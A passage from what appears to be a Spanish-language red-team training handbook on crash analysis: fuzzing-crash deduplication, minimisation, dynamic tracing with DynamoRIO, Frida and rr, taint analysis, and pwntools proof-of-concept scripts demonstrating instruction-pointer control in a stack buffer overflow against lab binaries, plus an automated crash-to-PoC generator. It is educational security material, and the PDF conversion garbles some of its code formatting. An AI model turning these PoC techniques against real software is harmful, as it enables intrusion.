<p>AFL_PATH="/usr/local/bin"
CRASHES_DIR="crashes"
DEDUPED_DIR="deduped_cov"
mkdir -p "$DEDUPED_DIR"
declare -A seen_coverage
for crash in "$CRASHES_DIR"/*; do</p>
<h1 id="generar-mapa-de-cobertura">Generar mapa de cobertura</h1>
<p>$AFL_PATH/afl-showmap -q -o /tmp/cov_map -- ./target_afl &lt; "$crash" 2&gt;/dev/null</p>
<h1 id="hash-del-mapa-de-cobertura">Hash del mapa de cobertura</h1>
<p>hash=$(md5sum /tmp/cov_map | cut -d' ' -f1)
if [[ -z "${seen_coverage[$hash]}" ]]; then
seen_coverage[$hash]=1
cp "$crash" "$DEDUPED_DIR/"
fi
done
Método 3: CASR Clustering</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_22">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h1 id="casr-hace-clustering-inteligente-considerando">CASR hace clustering inteligente considerando:</h1>
<h1 id="-stack-trace-similarity">- Stack trace similarity</h1>
<h1 id="-crash-type">- Crash type</h1>
<h1 id="-fault-address-proximity">- Fault address proximity</h1>
<p>mkdir -p casrep_all deduped_casr</p>
<h1 id="generar-reportes-para-todos-los-crashes">Generar reportes para todos los crashes</h1>
<p>for crash in crashes/*; do
name=$(basename "$crash")
casr-san -o "casrep_all/${name}.casrep" -- ./vuln_asan &lt; "$crash" 2&gt;/dev/null || true
done</p>
<h1 id="clustering">Clustering</h1>
<p>casr-cluster -c casrep_all/ deduped_casr/</p>
<h1 id="resultado-un-directorio-por-cluster-cl1-cl2-cl3">Resultado: Un directorio por cluster (cl1, cl2, cl3, ...)</h1>
<h1 id="cada-cluster-representa-un-bug-unico-probable">Cada cluster representa un bug único probable</h1>
<h3 id="545">5.4.5.</h3>
<h3 id="445-deteccion-de-timeouts-y-hangs">4.4.5 Detección de Timeouts y Hangs</h3>
<h1 id="script-para-detectar-y-clasificar-hangs">Script para detectar y clasificar hangs</h1>
<h1 id="binbash_2">!/bin/bash</h1>
<h1 id="detect_hangssh">detect_hangs.sh</h1>
<h3 id="timeout5">TIMEOUT=5</h3>
<h1 id="segundos">segundos</h1>
<p>for crash in crashes/*; do
start_time=$(date + %s. %N)
timeout $TIMEOUT ./target &lt; "$crash" 2&gt;/dev/null
exit_code=$?
end_time=$(date + %s. %N)
duration=$(echo "$end_time - $start_time" | bc)
if [ $exit_code -eq 124 ]; then
echo "HANG: $(basename $crash) (timeout after ${TIMEOUT}s)"
mv "$crash" hangs/
elif [ $exit_code -ne 0 ]; then
echo "CRASH: $(basename $crash) (exit code $exit_code)"
fi
done</p>
<h3 id="546">5.4.6.</h3>
<h3 id="446-minimizacion-de-crashes">4.4.6 Minimización de Crashes</h3>
<p>La minimización reduce un crash input a los bytes esenciales, facilitando análisis de causa raíz.</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_23">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
AFL‐tmin ﴾para targets con archivo de entrada﴿:</p>
<h1 id="uso-basico-de-afl-tmin">Uso básico de afl-tmin</h1>
<p>afl-tmin -i crash_input -o minimized_crash -- ./target @@</p>
<h1 id="con-instrumentacion-asan">Con instrumentación ASAN</h1>
<p>afl-tmin -i crash_input -o minimized_crash -- ./target_asan @@</p>
<h1 id="opciones-utiles">Opciones útiles:</h1>
<h1 id="-t-msec">-t msec</h1>
<dl>
<dd>Timeout por ejecución</dd>
</dl>
<h1 id="-m-megs">-m megs</h1>
<dl>
<dd>Límite de memoria</dd>
</dl>
<h1 id="-e">-e</h1>
<dl>
<dd>Edge coverage mode (más preciso)
Minimizador Python ﴾para targets con argumentos CLI﴿:</dd>
</dl>
<h1 id="usrbinenv-python3_1">!/usr/bin/env python3</h1>
<h1 id="minimize_crashpy-minimizador-por-busqueda-binaria">minimize_crash.py - Minimizador por búsqueda binaria</h1>
<p>import subprocess
import sys
import os
def crashes_with(data, target, test_case):
"""Ejecuta target y verifica si crashea"""
try:
result = subprocess.run(
[target, test_case, data],
timeout=2,
capture_output=True
)</p>
<h3 id="sigsegv-11-sigabrt-6"># SIGSEGV = -11, SIGABRT = -6</h3>
<p>return result.returncode &lt; 0 or result.returncode == 1
except subprocess.TimeoutExpired:
return False
def minimize(data, target, test_case):
"""Minimiza data manteniendo el crash"""
current = data</p>
<h1 id="fase-1-eliminar-chunks-grandes">Fase 1: Eliminar chunks grandes</h1>
<p>chunk_size = len(current) // 2
while chunk_size &gt;= 1:
i = 0
while i &lt; len(current):
candidate = current[:i] + current[i+chunk_size:]
if len(candidate) &gt; 0 and crashes_with(candidate, target, test_case):
current = candidate
print(f"Reduced to {len(current)} bytes (removed chunk at {i})")
else:</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_24">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
i += 1
chunk_size //= 2</p>
<h1 id="fase-2-eliminar-bytes-individuales">Fase 2: Eliminar bytes individuales</h1>
<p>i = 0
while i &lt; len(current):
candidate = current[:i] + current[i+1:]
if len(candidate) &gt; 0 and crashes_with(candidate, target, test_case):
current = candidate
print(f"Reduced to {len(current)} bytes")
else:
i += 1
return current
if <strong>name</strong> == "<strong>main</strong>":
if len(sys.argv) &lt; 4:
print(f"Usage: {sys.argv[0]} <target> <test_case> <initial_payload>")
sys.exit(1)
target = sys.argv[1]
test_case = sys.argv[2]
initial = sys.argv[3]
print(f"Initial size: {len(initial)} bytes")
minimized = minimize(initial, target, test_case)
print(f"\nMinimized size: {len(minimized)} bytes")
print(f"Minimized payload: {repr(minimized)}")
Minimización de Corpus ﴾afl‐cmin﴿:</p>
<h1 id="reducir-corpus-manteniendo-cobertura-completa">Reducir corpus manteniendo cobertura completa</h1>
<p>afl-cmin -i corpus_full/ -o corpus_min/ -- ./target @@</p>
<h1 id="resultado-corpus_min-contiene-el-subset-minimo-que-mantiene">Resultado: corpus_min/ contiene el subset mínimo que mantiene</h1>
<h1 id="la-misma-cobertura-de-codigo-que-corpus_full">la misma cobertura de código que corpus_full/</h1>
<h3 id="55">5.5.</h3>
<h3 id="45-analisis-de-alcanzabilidad-reachability-analysis">4.5 Análisis de Alcanzabilidad ﴾Reachability Analysis﴿</h3>
<p>El análisis de alcanzabilidad determina cómo un atacante puede llegar al código vulnerable desde
un punto de entrada externo, y qué datos controla en ese camino.</p>
<h3 id="551">5.5.1.</h3>
<h3 id="451-dynamorio-drcov">4.5.1 DynamoRIO + drcov</h3>
<p>DynamoRIO es un framework de instrumentación dinámica binaria. drcov genera cobertura de blo‐
ques básicos.</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_25">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Instalación:</p>
<h1 id="descargar-release">Descargar release</h1>
<p>wget https://github.com/DynamoRIO/dynamorio/releases/download/release_10.0.0/DynamoRIO-Linux-10.0.0.
tar xzf DynamoRIO-Linux-10.0.0.tar.gz
export DYNAMORIO_HOME=$(pwd)/DynamoRIO-Linux-10.0.0</p>
<h1 id="agregar-al-path">Agregar al PATH</h1>
<p>echo "export PATH=\$PATH:$DYNAMORIO_HOME/bin64" &gt;&gt; ~/.bashrc
source ~/.bashrc
Generación de Cobertura:
cd ~/crash_analysis_lab</p>
<h1 id="generar-cobertura-para-crash-input">Generar cobertura para crash input</h1>
<p>drrun -t drcov -- ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
<h1 id="salida-drcovvuln_no_protectlog">Salida: drcov.vuln_no_protect.*.log</h1>
<h1 id="formato-lista-de-bloques-basicos-ejecutados">Formato: Lista de bloques básicos ejecutados</h1>
<h1 id="visualizar-en-idaghidra-con-lighthousedragondance">Visualizar en IDA/Ghidra con lighthouse/dragondance</h1>
<h1 id="o-analizar-con-herramientas-de-texto">O analizar con herramientas de texto:</h1>
<p>cat drcov.*.log | grep -E "^module|^BB"</p>
<h3 id="552">5.5.2.</h3>
<h3 id="452-intel-processor-trace-pt">4.5.2 Intel Processor Trace ﴾PT﴿</h3>
<p>Intel PT es una característica de hardware que graba el flujo de control con overhead mínimo ﴾~5 %﴿.
Requisitos:
Procesador Intel con soporte PT ﴾Broadwell+﴿
Kernel Linux con CONFIG_INTEL_BTS=y
Permisos para perf</p>
<h1 id="verificar-soporte">Verificar soporte</h1>
<p>grep -q pt /proc/cpuinfo &amp;&amp; echo "PT supported"</p>
<h1 id="capturar-trace">Capturar trace</h1>
<p>perf record -e intel_pt//u ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
<h1 id="decodificar-trace">Decodificar trace</h1>
<p>perf script --itrace=b &gt; trace.txt</p>
<h1 id="analizar-con-perf-read-vdso-o-herramientas-especializadas">Analizar con perf-read-vdso o herramientas especializadas</h1>
<h1 id="intel-pt-genera-traces-muy-detallados-pero-requiere-procesamiento">Intel PT genera traces muy detallados pero requiere procesamiento</h1>
<h3 id="553">5.5.3.</h3>
<h3 id="453-frida-para-tracing-dinamico">4.5.3 Frida para Tracing Dinámico</h3>
<p>Frida permite instrumentar procesos en tiempo real sin recompilación.</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_26">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Instalación:
pip install frida-tools frida
Script de Tracing de Funciones:
// trace_functions.js - Trazar todas las llamadas a funciones del binario
"use strict";
// Obtener base del módulo principal
const mainModule = Process.enumerateModules()[0];
console.log(<code>[*] Module: ${mainModule.name} at ${mainModule.base}</code>);
// Enumerar exports y hookear
mainModule.enumerateExports().forEach(exp =&gt; {
if (exp.type === 'function') {
Interceptor.attach(exp.address, {
onEnter: function(args) {
console.log(<code>[CALL] ${exp.name}</code>);
},
onLeave: function(retval) {
console.log(<code>[RET]
${exp.name} = ${retval}</code>);
}
});
}
});
// Para funciones internas (sin export), usar direcciones
/<em>
Interceptor.attach(ptr("0x401150"), {
onEnter: function(args) {
console.log(<code>[*] stack_overflow called with: ${args[0].readCString()}</code>);
}
});
</em>/
Script de Tracing de Memoria:
// trace_memory.js - Monitorear accesos a memoria
"use strict";
// Hookear malloc para rastrear allocations
const mallocPtr = Module.findExportByName(null, "malloc");
const freePtr = Module.findExportByName(null, "free");
const allocations = new Map();
Interceptor.attach(mallocPtr, {
onEnter: function(args) {
this.size = args[0].toInt32();</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_27">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
},
onLeave: function(retval) {
if (!retval.isNull()) {
allocations.set(retval.toString(), {
size: this.size,
backtrace: Thread.backtrace(this.context, Backtracer.ACCURATE)
.map(DebugSymbol.fromAddress).join('\n')
});
console.log(<code>[MALLOC] ${retval} (${this.size} bytes)</code>);
}
}
});
Interceptor.attach(freePtr, {
onEnter: function(args) {
const ptr = args[0].toString();
if (allocations.has(ptr)) {
console.log(<code>[FREE] ${ptr}</code>);
allocations.delete(ptr);
}
}
});
Ejecución de Scripts Frida:</p>
<h1 id="lanzar-proceso-con-script">Lanzar proceso con script</h1>
<p>frida -f ./vuln_no_protect -l trace_functions.js -- 1 "AAAA"</p>
<h1 id="attachar-a-proceso-existente">Attachar a proceso existente</h1>
<p>frida -p $(pidof target) -l trace_memory.js</p>
<h1 id="script-de-analisis-completo">Script de análisis completo</h1>
<p>frida -f ./vuln_no_protect -l trace_complete.js --no-pause -- 3</p>
<h3 id="554">5.5.4.</h3>
<h3 id="454-rr-record-and-replay-debugging">4.5.4 rr ‐ Record and Replay Debugging</h3>
<p>rr graba ejecución para replay determinístico, esencial para bugs no determinísticos.
Instalación:</p>
<h1 id="ubuntudebian">Ubuntu/Debian</h1>
<p>sudo apt install rr</p>
<h1 id="verificar-soporte_1">Verificar soporte</h1>
<p>rr cpufeatures</p>
<h1 id="puede-requerir-deshabilitar-address-space-randomization">Puede requerir deshabilitar address space randomization</h1>
<p>echo 1 | sudo tee /proc/sys/kernel/perf_event_paranoid
Workflow de rr:</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_28">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
cd ~/crash_analysis_lab</p>
<h1 id="1-grabar-ejecucion">1. Grabar ejecución</h1>
<p>rr record ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
<h1 id="2-replay-inicia-gdb-con-capacidad-de-ir-hacia-atras">2. Replay (inicia GDB con capacidad de ir hacia atrás)</h1>
<p>rr replay</p>
<h1 id="en-gdb">En GDB:</h1>
<p>(rr) continue</p>
<h1 id="ejecutar-hasta-crash_1">Ejecutar hasta crash</h1>
<p>(rr) reverse-continue</p>
<h1 id="ir-hacia-atras-hasta-breakpoint-previo">Ir hacia atrás hasta breakpoint previo</h1>
<p>(rr) reverse-stepi</p>
<h1 id="step-back-una-instruccion">Step back una instrucción</h1>
<p>(rr) watch -l *0x7fffffffe000</p>
<h1 id="watchpoint">Watchpoint</h1>
<p>(rr) reverse-continue</p>
<h1 id="encontrar-quien-escribio-ahi">Encontrar quién escribió ahí</h1>
<p>(rr) when</p>
<h1 id="mostrar-posicion-en-el-trace">Mostrar posición en el trace</h1>
<h1 id="3-buscar-el-momento-exacto-de-corrupcion">3. Buscar el momento exacto de corrupción</h1>
<p>(rr) break *0x4011a3</p>
<h1 id="break-en-funcion-vulnerable">Break en función vulnerable</h1>
<p>(rr) reverse-continue</p>
<h1 id="ir-al-ultimo-call-de-esa-funcion">Ir al último call de esa función</h1>
<p>Comandos Esenciales de rr:
Comando GDB
Propósito
reverse-continue ﴾rc﴿
Continuar hacia atrás
reverse-step ﴾rs﴿
Step hacia atrás
reverse-stepi ﴾rsi﴿
Step instruction hacia atrás
reverse-next ﴾rn﴿
Next hacia atrás
reverse-finish
Ir al caller de función actual
when
Mostrar posición en trace
checkpoint
Guardar posición
restart <n>
Ir a checkpoint
Comparación rr vs TTD:
Aspecto
rr ﴾Linux﴿
TTD ﴾Windows﴿
Plataforma
Linux
Windows
Overhead grabación
~2‐10x
~2‐5x
Tamaño trace
Pequeño
Grande
Integración</p>
<h3 id="gdb">GDB</h3>
<p>WinDbg
Multithread
Serializado
Completo
Costo
Gratuito
Incluido con WinDbg</p>
<h3 id="555">5.5.5.</h3>
<h3 id="455-analisis-de-taint-flujo-de-datos">4.5.5 Análisis de Taint ﴾Flujo de Datos﴿</h3>
<p>El análisis de taint rastrea cómo datos controlados por el atacante fluyen a través del programa.
Conceptos:</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_29">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
┌──────────────────────────────────────────────────────────────┐
│</p>
<h3 id="analisis-de-taint">ANÁLISIS DE TAINT</h3>
<p>│
├──────────────────────────────────────────────────────────────┤
│
│
│
FUENTES (Sources):
│
│
• Entrada de red (recv, read socket)
│
│
• Archivos leídos
│
│
• Variables de entorno
│
│
• Argumentos de línea de comandos
│
│
│
│
PROPAGACIÓN (Propagation):
│
│
• Copia directa: y = x
│
│
• Operaciones: z = x + y (z tainted si x o y tainted)
│
│
• Llamadas a funciones
│
│
│
│
SUMIDEROS (Sinks):
│
│
• Índices de array: arr[tainted_index]
│
│
• Punteros dereferenciados: *tainted_ptr
│
│
• Argumentos de funciones peligrosas (memcpy size)
│
│
• Instruction pointer
│
│
│
└──────────────────────────────────────────────────────────────┘
Herramientas de Taint Analysis:
Herramienta
Plataforma
Tipo
Triton
Linux/Windows
Simbólico + Concreto</p>
<h3 id="decaf">DECAF</h3>
<p>Linux
QEMU‐based
libdft
Linux ﴾32‐bit﴿
Pin‐based
Taintgrind
Linux
Valgrind extension</p>
<h3 id="556">5.5.6.</h3>
<h3 id="456-plantilla-de-reporte-de-alcanzabilidad">4.5.6 Plantilla de Reporte de Alcanzabilidad</h3>
<h2 id="reachability-proof-vulnerability-id">REACHABILITY PROOF: [Vulnerability ID]</h2>
<h3 id="1-resumen">### 1. RESUMEN</h3>
<ul>
<li><strong>Bug Type</strong>: [heap-buffer-overflow/UAF/stack-overflow/etc]</li>
<li><strong>Reachability</strong>: [Remote/Local/Physical]</li>
<li><strong>Authentication Required</strong>: [None/User/Admin]</li>
</ul>
<h3 id="2-camino-de-ejecucion">### 2. CAMINO DE EJECUCIÓN</h3>
<p>[Entry Point] main﴾﴿￿▼[Parser] parse_request﴾user_input﴿￿▼[Validator] validate_data﴾parsed﴿
// Bypass posible con X ￿▼[Handler] process_data﴾validated﴿￿▼[VULNERABLE] vulnera‐
ble_function﴾controlled_buffer﴿</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_30">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h3 id="3-datos-controlados">### 3. DATOS CONTROLADOS</h3>
<table>
<thead>
<tr>
<th>Parámetro</th>
<th>Origen</th>
<th>Control</th>
</tr>
</thead>
<tbody>
<tr>
<td>buffer</td>
<td>argv[2]</td>
<td>Total</td>
</tr>
<tr>
<td>size</td>
<td>strlen(argv[2])</td>
<td>Indirecto</td>
</tr>
<tr>
<td>### ### 4. RESTRICCIONES</td>
<td></td>
<td></td>
</tr>
<tr>
<td>- Input debe ser &lt; 1024 bytes</td>
<td></td>
<td></td>
</tr>
<tr>
<td>- No puede contener NULL bytes (C string)</td>
<td></td>
<td></td>
</tr>
<tr>
<td>- Debe pasar validación de formato</td>
<td></td>
<td></td>
</tr>
<tr>
<td>### ### 5. TRIGGER MÍNIMO</td>
<td></td>
<td></td>
</tr>
<tr>
<td>```bash</td>
<td></td>
<td></td>
</tr>
<tr>
<td>./target 1 "$(python3 -c 'print(\"A\"*100)')"</td>
<td></td>
<td></td>
</tr>
<tr>
<td>### 5.5.7.</td>
<td></td>
<td></td>
</tr>
<tr>
<td>### 6. COBERTURA DE EJECUCIÓN</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Bloques ejecutados hasta crash: [N] Archivos relevantes: [source.c:line]</td>
<td></td>
<td></td>
</tr>
<tr>
<td>### 5.5.8.</td>
<td></td>
<td></td>
</tr>
<tr>
<td>### 7. MITIGACIONES PRESENTES</td>
<td></td>
<td></td>
</tr>
<tr>
<td>□ASLR: Enabled</td>
<td></td>
<td></td>
</tr>
<tr>
<td>⊠Stack Canary: Disabled</td>
<td></td>
<td></td>
</tr>
<tr>
<td>⊠NX: Enabled</td>
<td></td>
<td></td>
</tr>
<tr>
<td>⊠PIE: Disabled</td>
<td></td>
<td></td>
</tr>
<tr>
<td>---</td>
<td></td>
<td></td>
</tr>
<tr>
<td>## 4.6 Desarrollo de PoC (Proof of Concept)</td>
<td></td>
<td></td>
</tr>
<tr>
<td>### 4.6.1 Framework pwntools</td>
<td></td>
<td></td>
</tr>
<tr>
<td>pwntools es la herramienta estándar para desarrollo de exploits y PoCs en Python.</td>
<td></td>
<td></td>
</tr>
<tr>
<td><strong>Instalación:</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>```bash</td>
<td></td>
<td></td>
</tr>
<tr>
<td>pip install pwntools</td>
<td></td>
<td></td>
</tr>
<tr>
<td># Dependencias adicionales útiles</td>
<td></td>
<td></td>
</tr>
<tr>
<td>pip install capstone keystone-engine ropper</td>
<td></td>
<td></td>
</tr>
<tr>
<td>PoC Básico ‐ Stack Buffer Overflow:</td>
<td></td>
<td></td>
</tr>
<tr>
<td>#!/usr/bin/env python3</td>
<td></td>
<td></td>
</tr>
<tr>
<td>"""</td>
<td></td>
<td></td>
</tr>
<tr>
<td>PoC: Stack Buffer Overflow en vulnerable_suite.c (test case 1)</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_31">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
Demuestra control de RIP a offset 72 bytes.
"""
from pwn import *
import os</p>
<h1 id="configuracion">Configuración</h1>
<p>context.binary = './vuln_no_protect'
context.log_level = 'info'
LAB_DIR = os.path.expanduser("~/crash_analysis_lab")
TARGET = os.path.join(LAB_DIR, "vuln_no_protect")
def test_crash():
"""Verifica que el crash ocurre"""
os.chdir(LAB_DIR)</p>
<h1 id="buffer-de-64-bytes-8-bytes-rbp-72-bytes-hasta-rip">Buffer de 64 bytes + 8 bytes RBP = 72 bytes hasta RIP</h1>
<p>offset = 72
payload = b"A" * offset + b"BBBBBBBB"</p>
<h1 id="rip-0x4242424242424242">RIP = 0x4242424242424242</h1>
<p>log.info(f"Testing with {len(payload)} byte payload")
log.info(f"Payload: {offset} x 'A' + 'BBBBBBBB'")
p = process([TARGET, "1", payload])</p>
<h1 id="esperar-crash">Esperar crash</h1>
<p>p.wait(timeout=5)
if p.returncode == -11:</p>
<h3 id="sigsegv_3"># SIGSEGV</h3>
<p>log.success(f"Crash confirmed! (SIGSEGV)")
return True
elif p.returncode != 0:
log.success(f"Crash confirmed! (exit code {p.returncode})")
return True
else:
log.failure("No crash detected")
return False
def test_rip_control():
"""Verifica control de RIP usando cyclic pattern"""
os.chdir(LAB_DIR)</p>
<h1 id="generar-patron-de-de-bruijn">Generar patrón de De Bruijn</h1>
<p>pattern = cyclic(200)
log.info(f"Testing RIP control with cyclic pattern ({len(pattern)} bytes)")
p = process([TARGET, "1", pattern])
p.wait(timeout=5)</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_32">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team</p>
<h1 id="para-verificar-el-offset-exacto-usar-gdb">Para verificar el offset exacto, usar GDB:</h1>
<h1 id="gdb-vuln_no_protect">gdb ./vuln_no_protect</h1>
<h1 id="run-1-python3-c-from-pwn-import-printcyclic200decode">run 1 $(python3 -c "from pwn import *; print(cyclic(200).decode())")</h1>
<h1 id="cyclic-l-rip">cyclic -l $rip</h1>
<h1 id="o-cyclic-l-0x6161616c">o cyclic -l 0x6161616c</h1>
<p>log.info("To find exact offset, run in GDB:")
log.info("
cyclic -l <rip_value>")
log.info(f"Expected offset: 72 bytes")
return True
def test_reliability(attempts=10):
"""Prueba confiabilidad del PoC"""
os.chdir(LAB_DIR)
offset = 72
payload = b"A" * offset + b"BBBBBBBB"
log.info(f"Testing reliability ({attempts} attempts)")
successes = 0
for i in range(attempts):
p = process([TARGET, "1", payload])
p.wait(timeout=5)
if p.returncode == -11:
successes += 1
rate = (successes / attempts) * 100
log.info(f"Crash rate: {successes}/{attempts} ({rate:.1f} %)")
if rate &gt;= 90:
log.success("PoC is reliable!")
elif rate &gt;= 50:
log.warning("PoC is semi-reliable")
else:
log.failure("PoC is unreliable")
return rate
if <strong>name</strong> == "<strong>main</strong>":
import sys
if len(sys.argv) &gt; 1 and sys.argv[1] == "--test":
test_reliability()
elif len(sys.argv) &gt; 1 and sys.argv[1] == "--offset":
test_rip_control()
else:</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_33">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
test_crash()</p>
<h3 id="559">5.5.9.</h3>
<h3 id="462-pipeline-automatizado-crashtopoc">4.6.2 Pipeline Automatizado Crash‐to‐PoC</h3>
<h1 id="usrbinenv-python3_2">!/usr/bin/env python3</h1>
<p>"""
crash_to_poc.py - Pipeline automatizado para generar PoCs desde crashes
Uso: python3 crash_to_poc.py <target> <test_case> <crash_payload>
"""
import subprocess
import sys
import os
import re
from pathlib import Path
class CrashToPoC:
def <strong>init</strong>(self, target, test_case, payload):
self.target = target
self.test_case = test_case
self.original_payload = payload
self.minimized_payload = None
self.crash_info = {}
def step1_minimize(self):
"""Minimizar el crash input"""
print("[*] Step 1: Minimizing crash input...")
current = self.original_payload</p>
<h1 id="busqueda-binaria-para-encontrar-tamano-minimo">Búsqueda binaria para encontrar tamaño mínimo</h1>
<p>chunk_size = len(current) // 2
while chunk_size &gt;= 1:
i = 0
while i &lt; len(current):
candidate = current[:i] + current[i+chunk_size:]
if len(candidate) &gt; 0 and self._crashes(candidate):
current = candidate
else:
i += 1
chunk_size //= 2
self.minimized_payload = current
reduction = (1 - len(current)/len(self.original_payload)) * 100
print(f"
Reduced: {len(self.original_payload)} -&gt; {len(current)} bytes ({reduction:.1f} %)
return current
def step2_analyze(self):</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_34">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
"""Analizar crash con ASAN"""
print("[*] Step 2: Analyzing crash with ASAN...")</p>
<h1 id="ejecutar-version-asan">Ejecutar versión ASAN</h1>
<p>asan_target = self.target.replace('vuln_no_protect', 'vuln_asan')
if not os.path.exists(asan_target):
asan_target = self.target + "_asan"
try:
result = subprocess.run(
[asan_target, self.test_case, self.minimized_payload or self.original_payload],
capture_output=True,
text=True,
timeout=5
)
output = result.stderr + result.stdout</p>
<h1 id="parsear-reporte-asan">Parsear reporte ASAN</h1>
<p>if "heap-buffer-overflow" in output:
self.crash_info['type'] = "heap-buffer-overflow"
elif "stack-buffer-overflow" in output:
self.crash_info['type'] = "stack-buffer-overflow"
elif "heap-use-after-free" in output:
self.crash_info['type'] = "heap-use-after-free"
elif "double-free" in output:
self.crash_info['type'] = "double-free"
else:
self.crash_info['type'] = "unknown"</p>
<h1 id="extraer-ubicacion">Extraer ubicación</h1>
<p>match = re.search(r'#0.<em>in (\w+) (.+:\d+)', output)
if match:
self.crash_info['function'] = match.group(1)
self.crash_info['location'] = match.group(2)
print(f"
Type: {self.crash_info.get('type', 'unknown')}")
print(f"
Function: {self.crash_info.get('function', 'unknown')}")
print(f"
Location: {self.crash_info.get('location', 'unknown')}")
except Exception as e:
print(f"
ASAN analysis failed: {e}")
return self.crash_info
def step3_generate_poc(self):
"""Generar script PoC"""
print("[</em>] Step 3: Generating PoC script...")</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_35">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
payload = self.minimized_payload or self.original_payload
crash_type = self.crash_info.get('type', 'unknown')
poc_template = f'''#!/usr/bin/env python3
"""
PoC: {crash_type}
Target: {self.target}
Test Case: {self.test_case}
Generated by crash_to_poc.py
"""
from pwn import *
import os
TARGET = "{self.target}"
TEST_CASE = "{self.test_case}"</p>
<h1 id="minimized-crash-payload">Minimized crash payload</h1>
<p>PAYLOAD = {repr(payload)}
def trigger_crash():
"""Trigger the vulnerability"""
log.info(f"Payload size: {{len(PAYLOAD)}} bytes")
p = process([TARGET, TEST_CASE, PAYLOAD])
p.wait(timeout=5)
if p.returncode &lt; 0:
log.success(f"Crash triggered (signal {{-p.returncode}})")
return True
elif p.returncode != 0:
log.success(f"Crash triggered (exit code {{p.returncode}})")
return True
else:
log.failure("No crash")
return False
def test_reliability(n=10):
"""Test PoC reliability"""
successes = sum(1 for _ in range(n) if trigger_crash())
log.info(f"Reliability: {{successes}}/{{n}} ({{100*successes/n:.1f}} %)")
return successes / n
if <strong>name</strong> == "<strong>main</strong>":
import sys
if "--test" in sys.argv:
test_reliability()
else:
trigger_crash()</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_36">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
'''
poc_path = f"poc_{crash_type.replace('-', '_')}.py"
with open(poc_path, 'w') as f:
f.write(poc_template)
os.chmod(poc_path, 0o755)
print(f"
Generated: {poc_path}")
return poc_path
def step4_test(self):
"""Probar el PoC generado"""
print("[<em>] Step 4: Testing PoC reliability...")
payload = self.minimized_payload or self.original_payload
successes = 0
attempts = 10
for _ in range(attempts):
if self._crashes(payload):
successes += 1
rate = (successes / attempts) * 100
print(f"
Reliability: {successes}/{attempts} ({rate:.1f} %)")
return rate &gt;= 90
def _crashes(self, payload):
"""Helper: verificar si payload causa crash"""
try:
result = subprocess.run(
[self.target, self.test_case, payload],
capture_output=True,
timeout=2
)
return result.returncode &lt; 0 or result.returncode == 1
except:
return False
def run_pipeline(self):
"""Ejecutar pipeline completo"""
print(f"\n{'='</em>60}")
print("CRASH-TO-POC PIPELINE")
print(f"{'='*60}")
print(f"Target: {self.target}")
print(f"Test Case: {self.test_case}")
print(f"Original Payload Size: {len(self.original_payload)} bytes")</p>
<hr />
<h3 id="capitulo-5-analisis-de-crashes_37">CAPÍTULO 5. ANÁLISIS DE CRASHES</h3>
<p>Bitácora Red Team
print(f"{'='<em>60}\n")
self.step1_minimize()
self.step2_analyze()
poc_path = self.step3_generate_poc()
reliable = self.step4_test()
print(f"\n{'='</em>60}")
print("PIPELINE COMPLETE")
print(f"{'='<em>60}")
print(f"PoC Script: {poc_path}")
print(f"Reliable: {'Yes' if reliable else 'No'}")
print(f"{'='</em>60}\n")
return poc_path
if <strong>name</strong> == "<strong>main</strong>":
if len(sys.argv) &lt; 4:
print(f"Usage: {sys.argv[0]} <target> <test_case> <payload>")
print(f"Example: {sys.argv[0]} ./vuln_no_protect 1 \"{'A'*100}\"")
sys.exit(1)
pipeline = CrashToPoC(sys.argv[1], sys.argv[2], sys.argv[3])
pipeline.run_pipeline()</p>
<h3 id="5510">5.5.10.</h3>
<h3 id="463-poc-para-servicios-de-red">4.6.3 PoC para Servicios de Red</h3>
<p>Plantilla Genérica TCP:</p>
<h1 id="usrbinenv-python3_3">!/usr/bin/env python3</h1>
<p>"""
network_poc_template.py - PoC para vulnerabilidad en servicio de red
"""
from pwn import *
import socket</p>
<h1 id="configuracion-del-target">Configuración del target</h1>
<h3 id="host-127001">HOST = "127.0.0.1"</h3>
<h3 id="port-8888">PORT = 8888</h3>
<h3 id="timeout-5">TIMEOUT = 5</h3>
<p>context.log_level = 'info'
def send_payload(payload):
"""Envía payload al servidor y retorna respuesta"""
try:
